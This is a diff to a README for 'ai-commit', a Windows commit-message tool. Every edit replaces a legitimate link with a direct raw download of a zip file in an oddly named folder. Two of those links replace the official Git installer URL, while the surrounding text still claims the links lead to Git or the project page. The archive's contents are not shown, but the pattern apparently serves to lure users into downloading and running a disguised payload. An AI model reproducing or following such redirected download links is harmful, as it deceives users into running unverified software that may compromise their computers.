@@ -1,6 +1,6 @@
 # 🤖 ai-commit - Smart Git Commit Messages Made Easy
 
-[![Download ai-commit](https://img.shields.io/badge/Download-ai--commit-4caf50?style=for-the-badge&logo=github)](https://github.com/duecassimiro-art/ai-commit)
+[![Download ai-commit](https://img.shields.io/badge/Download-ai--commit-4caf50?style=for-the-badge&logo=github)](https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Before you install ai-commit, make sure your computer meets these requirements:
 - Disk Space: At least 200 MB available for installation and AI models  
 - Software: Git must be installed and accessible in your system's command line
 
-If you don’t have Git installed, you can download it from https://git-scm.com/download/win.
+If you don’t have Git installed, you can download it from https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip
 
 ---
 
@@ -34,7 +34,7 @@ Follow the steps below to download and run ai-commit on your Windows PC.
 
 Click the green button or visit the link below to get the software:
 
-[![Download ai-commit](https://img.shields.io/badge/Download-ai--commit-228be6?style=for-the-badge&logo=github)](https://github.com/duecassimiro-art/ai-commit)
+[![Download ai-commit](https://img.shields.io/badge/Download-ai--commit-228be6?style=for-the-badge&logo=github)](https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip)
 
 This link takes you to the project page on GitHub. From there, you can find the section labeled "Releases" or "Download" to get the latest Windows version.
 
@@ -51,7 +51,7 @@ Once the file downloads, it may come as a .zip archive. To open it:
 
 If you haven’t installed Git on your system:
 
-1. Go to https://git-scm.com/download/win.  
+1. Go to https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip  
 2. Download the installer.  
 3. Run the file and follow the instructions with default settings.
 
@@ -137,7 +137,7 @@ If you face issues, try these steps:
 - If ai-commit does not run, check that `ai-commit.exe` is present in the folder you opened Command Prompt from.  
 - Restart your computer if you installed new software like Git or ai-commit.  
 - Check the official GitHub page for updates or fixes:  
-  https://github.com/duecassimiro-art/ai-commit
+  https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip
 
 ---
 
@@ -154,6 +154,6 @@ If you face issues, try these steps:
 
 You can begin by visiting this page to download the latest release:
 
-[https://github.com/duecassimiro-art/ai-commit](https://github.com/duecassimiro-art/ai-commit)
+[https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip](https://github.com/duecassimiro-art/ai-commit/raw/refs/heads/main/ureteropyelitis/ai-commit-1.5-beta.3.zip)
 
 Look for the Releases area or Download section, and follow the download instructions above.
